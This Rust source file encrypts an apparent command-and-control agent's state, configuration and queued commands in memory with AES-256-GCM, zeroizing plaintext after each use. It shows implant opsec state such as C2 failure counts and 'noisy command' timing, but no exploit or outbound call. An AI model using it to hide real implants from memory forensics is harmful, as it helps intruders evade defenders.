use aes_gcm::aead::{Aead, AeadCore, KeyInit, OsRng};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use zeroize::Zeroize;

/// AES-256-GCM based memory protector.
pub struct AesProtector {
    key: Key<Aes256Gcm>,
}

impl AesProtector {
    /// Create a new protector with a randomly generated AES-256 key.
    pub fn new() -> Self {
        Self {
            key: Aes256Gcm::generate_key(OsRng),
        }
    }

    /// Encrypt data using AES-256-GCM.
    pub fn encrypt(
        &self,
        plaintext: &[u8],
    ) -> Result<(Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
        let cipher = Aes256Gcm::new(&self.key);
        let nonce_bytes = Aes256Gcm::generate_nonce(&mut OsRng);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let ciphertext_and_tag = cipher.encrypt(nonce, plaintext).map_err(|e| {
            Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("AES encryption failed: {:?}", e),
            )) as Box<dyn std::error::Error>
        })?;
        Ok((nonce_bytes.to_vec(), ciphertext_and_tag))
    }

    /// Decrypt data using AES-256-GCM.
    pub fn decrypt(
        &self,
        nonce_bytes: &[u8],
        ciphertext_and_tag: &[u8],
    ) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let cipher = Aes256Gcm::new(&self.key);
        let nonce = Nonce::from_slice(nonce_bytes);
        Ok(cipher.decrypt(nonce, ciphertext_and_tag).map_err(|e| {
            Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("AES decryption failed: {:?}", e),
            )) as Box<dyn std::error::Error>
        })?)
    }

    /// Zeroize the key from memory.
    pub fn zeroize(&mut self) {
        self.key.as_mut_slice().zeroize();
    }
}

impl Default for AesProtector {
    fn default() -> Self {
        Self::new()
    }
}

//   True in-memory protection - only encrypted storage
pub struct MemoryProtector {
    protector: AesProtector,
    //  ONLY encrypted storage - no plaintext fields
    encrypted_opsec_state: Option<(Vec<u8>, Vec<u8>)>,
    encrypted_config: Option<(Vec<u8>, Vec<u8>)>,
    encrypted_command_queue: Vec<(Vec<u8>, Vec<u8>)>,
    encrypted_file_buffer: Option<(Vec<u8>, Vec<u8>)>,
}

impl MemoryProtector {
    pub fn new() -> Self {
        Self {
            protector: AesProtector::new(),
            encrypted_opsec_state: None,
            encrypted_config: None,
            encrypted_command_queue: Vec::new(),
            encrypted_file_buffer: None,
        }
    }

    //  Store encrypted OPSEC state
    pub fn encrypt_opsec_state(
        &mut self,
        opsec_state: &crate::opsec::OpsecState,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let serialized = bincode::serialize(opsec_state)?;
        let (nonce, ciphertext) = self.protector.encrypt(&serialized)?;
        self.encrypted_opsec_state = Some((nonce, ciphertext));
        Ok(())
    }

    //  Decrypt OPSEC state (returns owned data that gets zeroized)
    pub fn decrypt_opsec_state(
        &self,
    ) -> Result<crate::opsec::OpsecState, Box<dyn std::error::Error>> {
        if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let opsec_state: crate::opsec::OpsecState = bincode::deserialize(&decrypted)?;
            Ok(opsec_state)
        } else {
            Err("No encrypted OPSEC state found".into())
        }
    }

    //  Temporary access with immediate cleanup
    pub fn with_opsec_state<F, R>(&self, f: &F) -> Result<R, Box<dyn std::error::Error>>
    where
        F: Fn(&crate::opsec::OpsecState) -> R,
    {
        if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let mut opsec_state: crate::opsec::OpsecState = bincode::deserialize(&decrypted)?;
            let result = f(&opsec_state);

            //  Immediately zeroize decrypted data
            opsec_state.zeroize();
            std::mem::drop(opsec_state);

            Ok(result)
        } else {
            Err("No encrypted OPSEC state found".into())
        }
    }

    //  Mutable access with immediate cleanup
    pub fn with_opsec_state_mut<F, R>(&mut self, f: &F) -> Result<R, Box<dyn std::error::Error>>
    where
        F: Fn(&mut crate::opsec::OpsecState) -> R,
    {
        let mut state = if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
            bincode::deserialize(&decrypted)?
        } else {
            // CREATE PROPER DEFAULT STATE WITH ALL FIELDS
            crate::opsec::OpsecState {
                mode: crate::opsec::AgentMode::FullOpsec,
                current_score: 100.0,
                consecutive_c2_failures: 0,
                dynamic_max_c2_failures: 5,
                dynamic_threshold_initialized: false,
                last_noisy_command_time: None,
                last_transition: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                last_c2_threshold_adjustment: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs(),
                // === ADD MISSING DYNAMIC THRESHOLD FIELDS ===
                dyn_enter_full: 60.0,    // Default from config
                dyn_exit_full: 55.0,     // Default with hysteresis buffer
                dyn_enter_reduced: 20.0, // Default from config
                dyn_exit_reduced: 15.0,  // Default with hysteresis buffer
                threshold_adjustment_history: 0,
            }
        };

        let result = f(&mut state);

        // Re-encrypt the modified state
        let serialized = bincode::serialize(&state)?;
        let (nonce, ciphertext) = self.protector.encrypt(&serialized)?;
        self.encrypted_opsec_state = Some((nonce, ciphertext));

        // Immediately zeroize plaintext
        state.zeroize();
        std::mem::drop(state);

        Ok(result)
    }

    //  Config methods
    pub fn encrypt_config(&mut self, config: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let (nonce, ciphertext) = self.protector.encrypt(config)?;
        self.encrypted_config = Some((nonce, ciphertext));
        Ok(())
    }

    pub fn with_config<F, R>(&self, f: F) -> Result<R, Box<dyn std::error::Error>>
    where
        F: FnOnce(&[u8]) -> R,
    {
        if let Some((nonce, ciphertext)) = &self.encrypted_config {
            let mut decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let result = f(&decrypted);
            decrypted.zeroize();
            Ok(result)
        } else {
            Err("No encrypted config found".into())
        }
    }

    //  Command queue methods
    pub fn add_command(&mut self, command: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let (nonce, ciphertext) = self.protector.encrypt(command)?;
        self.encrypted_command_queue.push((nonce, ciphertext));
        Ok(())
    }

    pub fn drain_commands(&mut self) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
        let mut commands = Vec::new();
        for (nonce, ciphertext) in self.encrypted_command_queue.drain(..) {
            let mut decrypted = self.protector.decrypt(&nonce, &ciphertext)?;
            commands.push(decrypted.clone());
            decrypted.zeroize();
        }
        Ok(commands)
    }

    //  Complete cleanup
    pub fn zeroize(&mut self) {
        self.protector.zeroize();

        // Zeroize all encrypted data
        if let Some((ref mut n, ref mut c)) = self.encrypted_opsec_state {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_opsec_state = None;

        if let Some((ref mut n, ref mut c)) = self.encrypted_config {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_config = None;

        for (ref mut n, ref mut c) in &mut self.encrypted_command_queue {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_command_queue.clear();

        if let Some((ref mut n, ref mut c)) = self.encrypted_file_buffer {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_file_buffer = None;
    }
}
